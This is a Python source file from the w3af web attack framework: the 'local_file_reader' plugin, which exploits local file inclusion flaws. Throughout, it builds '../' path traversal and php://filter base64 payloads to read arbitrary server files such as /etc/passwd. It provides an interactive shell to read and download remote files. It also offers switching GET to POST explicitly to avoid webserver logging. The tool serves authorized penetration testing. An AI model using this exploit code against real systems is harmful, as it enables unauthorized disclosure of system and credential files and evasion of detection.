'''
local_file_reader.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import base64

import core.controllers.output_manager as om
import core.data.kb.knowledge_base as kb
import core.data.kb.vuln as vuln

from core.data.options.opt_factory import opt_factory
from core.data.options.option_list import OptionList
from core.data.kb.read_shell import read_shell as read_shell
from core.data.parsers.url import parse_qs

from core.controllers.exceptions import w3afException
from core.controllers.plugins.attack_plugin import AttackPlugin
from core.controllers.misc.levenshtein import relative_distance_ge

from plugins.attack.payloads.decorators.read_decorator import read_debug


class local_file_reader(AttackPlugin):
    '''
    Exploit local file inclusion bugs.
    @author: Andres Riancho (andres.riancho@gmail.com)
    '''

    def __init__(self):
        AttackPlugin.__init__(self)
        
        # Internal variables
        self._already_tested = []
        
        # User configured variables
        self._changeToPost = True
        self._url = 'http://host.tld/'
        self._method = 'GET'
        self._data = ''
        self._file_pattern = ''
        self._generate_only_one = True
        
    def fast_exploit( self ):
        '''
        Exploits a web app with local file include vuln.
        '''
        if self._url == ''or self._file_pattern == '' or self._data == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setPluginName(self.get_name())
            v.setURL( self._url )
            v.setMethod( self._method )
            v.set_dc( self._data )
            v['file_pattern'] = self._file_pattern
            kb.kb.append( 'lfi', 'lfi', v )
    
    def get_attack_type(self):
        '''
        @return: The type of exploit, SHELL, PROXY, etc.
        '''
        return 'shell'
    
    def get_kb_location( self ):
        '''
        This method should return the vulnerability name (as saved in the kb) to exploit.
        For example, if the audit.os_commanding plugin finds an vuln, and saves it as:
        
        kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
        
        Then the exploit plugin that exploits os_commanding ( attack.os_commanding ) should
        return 'os_commanding' in this method.
        '''        
        return 'lfi'
        
    def _generate_shell( self, vuln_obj ):
        '''
        @param vuln_obj: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verify_vuln( vuln_obj ):
            
            if vuln_obj.get_method() != 'POST' and self._changeToPost and \
            self._verify_vuln( self.GET2POST( vuln_obj ) ):
                msg = 'The vulnerability was found using method GET, but POST is being used during'
                msg += ' this exploit.'
                om.out.console( msg )
                vuln_obj = self.GET2POST( vuln_obj )
            else:
                msg = 'The vulnerability was found using method GET, tried to change the method to'
                msg += ' POST for exploiting but failed.'
                om.out.console( msg )
            
            # Create the shell object
            shell_obj = FileReaderShell( vuln_obj, self._uri_opener, 
                                         self._header_length, self._footer_length )
            
            return shell_obj
            
        else:
            return None

    def _verify_vuln( self, vuln_obj ):
        '''
        This command verifies a vuln.

        @return : True if vuln can be exploited.
        '''
        function_reference = getattr( self._uri_opener , vuln_obj.get_method() )
        
        #    Prepare the first request, with the original data
        data_a = str(vuln_obj.get_dc())
        
        #    Prepare the second request, with a non existent file
        vulnerable_parameter = vuln_obj.get_var()
        vulnerable_dc = vuln_obj.get_dc()
        vulnerable_dc_copy = vulnerable_dc.copy()
        vulnerable_dc_copy[ vulnerable_parameter ] = '/do/not/exist'
        data_b = str(vulnerable_dc_copy) 
        
        try:
            response_a = function_reference( vuln_obj.getURL(), data_a )
            response_b = function_reference( vuln_obj.getURL(), data_b )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            if self._guess_cut( response_a.getBody(), 
                                response_b.getBody(), 
                                vuln_obj['file_pattern'] ):
                return True
            else:
                return False

    def get_options( self ):
        '''
        @return: A list of option objects for this plugin.
        '''
        d0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        d0 += ' during exploitation.'
        h0 = 'If the vulnerability was found in a GET request, try to change the method to POST'
        h0 += ' during exploitation; this is usefull for not being logged in the webserver logs.'
        o0 = opt_factory('changeToPost', self._changeToPost, d0, 'boolean', help=h0)
        
        d1 = 'URL to exploit with fast_exploit()'
        o1 = opt_factory('url', self._url, d1, 'url')
        
        d2 = 'Method to use with fast_exploit()'
        o2 = opt_factory('method', self._method, d2, 'string')

        d3 = 'Data to send with fast_exploit()'
        o3 = opt_factory('data', self._data, d3, 'string')

        d4 = 'The file pattern to search for while verifiyng the vulnerability.'
        d4 += ' Only used in fast_exploit()'
        o4 = opt_factory('file_pattern', self._file_pattern, d4, 'string')

        d5 = 'Exploit only one vulnerability.'
        o5 = opt_factory('generateOnlyOne', self._generate_only_one, d5, 'boolean')
        
        ol = OptionList()
        ol.add(o0)
        ol.add(o1)
        ol.add(o2)
        ol.add(o3)
        ol.add(o4)
        ol.add(o5)
        return ol
        
    def set_options( self, options_list ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of get_options().
        
        @param options_list: A dict with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._changeToPost = options_list['changeToPost'].get_value()
        self._url = options_list['url'].get_value()
        self._method = options_list['method'].get_value()
        self._data = parse_qs( options_list['data'].get_value() )
        self._file_pattern = options_list['file_pattern'].get_value()
        self._generate_only_one = options_list['generateOnlyOne'].get_value()
        
    def get_root_probability( self ):
        '''
        @return: This method returns the probability of getting a root shell
                 using this attack plugin. This is used by the "exploit *"
                 function to order the plugins and first try to exploit the
                 more critical ones. This method should return 0 for an exploit
                 that will never return a root shell, and 1 for an exploit that
                 WILL ALWAYS return a root shell.
        '''
        return 0.0
        
    def get_long_desc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits local file inclusion and let's you "cat" every file you want. 
        Remember, if the file in being read with an "include()" statement, you wont be able 
        to read the source code of the script file, you will end up reading the result of the
        script interpretation. You can also use the "list" command to list all files inside 
        the known paths.
        
        Six configurable parameters exist:
            - changeToPost
            - url
            - method
            - data
            - generateOnlyOne
        '''

PERMISSION_DENIED = 'Permission denied.'
NO_SUCH_FILE =  'No such file or directory.'
READ_DIRECTORY = 'Cannot cat a directory.'
FAILED_STREAM = 'Failed to open stream.'

class FileReaderShell(read_shell):
    '''
    A shell object to exploit local file include and local file read vulns.

    @author: Andres Riancho (andres.riancho@gmail.com)
    '''
    
    def __init__(self, v, url_opener, header_len, footer_len):
        super(FileReaderShell, self).__init__(v)
        
        self.set_cut( header_len, footer_len )
        self._uri_opener = url_opener
        
        self._initialized = False
        self._application_file_not_found_error = None
        self._use_base64_wrapper = False
        
        self._init_read()

    def help( self, command ):
        '''
        Handle the help command.
        '''
        if command == 'help':
            om.out.console('')
            om.out.console('Available commands:')
            om.out.console('    help                            Display this information')
            om.out.console('    read                            Echoes the contents of a file.')
            om.out.console('    download                        Downloads a file to the local filesystem.')
            om.out.console('    list                            List files that may be interesting.')
            om.out.console('                                    Type "help list" for detailed information.')
            om.out.console('    exit                            Exit the shell session')
            om.out.console('')
        elif command == 'read':
            om.out.console('read help:')
            om.out.console('    The read command echoes the content of a file to the console. The')
            om.out.console('    command takes only one parameter: the full path of the file to ')
            om.out.console('    read.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    read /etc/passwd')
        elif command == 'download':
            om.out.console('download help:')
            om.out.console('    The download command reads a file in the remote system and saves')
            om.out.console('    it to the local filesystem.')
            om.out.console('')
            om.out.console('Examples:')
            om.out.console('    download /etc/passwd /tmp/passwd')
        return True
        
    def _init_read(self):
        '''
        This method requires a non existing file, in order to save the error
        message and prevent it to leak as the content of a file to the upper
        layers.
        
        Example:
            - Application behavior:
                1- (request) http://host.tld/read.php?file=/etc/passwd
                1- (response) "root:x:0:0:root:/root:/bin/bash..."
                
                2- (request) http://host.tld/read.php?file=/tmp/do_not_exist
                2- (response) "...The file doesn't exist, please try again...'"
                
            - Before implementing this check, the read method returned "The file
            doesn't exist, please try again" as if it was the content of the
            "/tmp/do_not_exist" file.
            
            - Now, we handle that case and return an empty string.
        
        The second thing we do here is to test if the remote site allows us to
        use "php://filter/convert.base64-encode/resource=" for reading files. This
        is very helpful for reading non-text files.
        '''
        # Error handling
        app_error = self.read('not_exist0.txt')
        self._application_file_not_found_error = app_error.replace("not_exist0.txt",  '')
        
        # PHP wrapper configuration
        self._use_base64_wrapper = False
        try:
            #FIXME: This only works in Linux!
            response = self._read_with_b64('/etc/passwd')
        except Exception, e:
            msg = 'Not using base64 wrapper for reading because of exception: "%s"'
            om.out.debug(msg % e)
        else:
            if 'root:' in response or '/bin/' in response:
                om.out.debug('Using base64 wrapper for reading.')
                self._use_base64_wrapper = True
            else:
                msg = 'Not using base64 wrapper for reading because response did'
                msg += ' not match "root:" or "/bin/".'
                om.out.debug( msg )
    
    @read_debug
    def read( self, filename ):
        '''
        Read a file and echo it's content.

        @return: The file content.
        '''
        if self._use_base64_wrapper:
            try:
                return self._read_with_b64(filename)
            except Exception, e:
                om.out.debug('read_with_b64 failed: "%s"' % e)
        
        return self._read_basic(filename)
    
    def _read_with_b64(self, filename):
        # TODO: Review this hack, does it work every time? What about null bytes?
        filename = '../' * 15 + filename
        filename = 'php://filter/convert.base64-encode/resource=' + filename
        
        filtered_response = self._read_utils(filename)

        filtered_response = filtered_response.strip()
        filtered_response = base64.b64decode(filtered_response)
        
        return filtered_response
    
    def _read_basic(self, filename):
        # TODO: Review this hack, does it work every time? What about null bytes?
        filename = '../' * 15 + filename
        filtered_response = self._read_utils(filename)
        return filtered_response
        
    def _read_utils(self, filename):
        '''
        Actually perform the request to the remote server and returns the response
        for parsing by the _read_with_b64 or _read_basic methods.
        '''
        function_reference = getattr( self._uri_opener , self.get_method() )
        data_container = self.get_dc().copy()
        data_container[ self.get_var() ] = filename
        try:
            response = function_reference( self.getURL() ,  str(data_container) )
        except w3afException, e:
            msg = 'Error "%s" while sending request to remote host. Try again.'
            return msg % e
        else:
            cutted_response = self._cut( response.getBody() )
            filtered_response = self._filter_errors( cutted_response, filename )
                            
            return filtered_response
                
    def _filter_errors( self, result,  filename ):
        '''
        Filter out ugly php errors and print a simple "Permission denied"
        or "File not found"
        '''
        #print filename
        error = None
        
        if result.count( 'Permission denied' ):
            error = PERMISSION_DENIED
        elif result.count( 'No such file or directory in' ):
            error = NO_SUCH_FILE
        elif result.count( 'Not a directory in' ):
            error = READ_DIRECTORY
        elif result.count(': failed to open stream: '):
            error = FAILED_STREAM
                
        elif self._application_file_not_found_error is not None:
            # The result string has the file I requested inside, so I'm going
            # to remove it.
            clean_result = result.replace( filename,  '')
            
            # Now I compare both strings, if they are VERY similar, then
            # filename is a non existing file.
            if relative_distance_ge(self._application_file_not_found_error,
                                    clean_result, 0.9):
                error = NO_SUCH_FILE

        #
        #    I want this function to return an empty string on errors.
        #    Not the error itself.
        #
        if error is not None:
            return ''
        
        return result
    
    def get_name( self ):
        '''
        @return: The name of this shell.
        '''
        return 'local_file_reader'
        
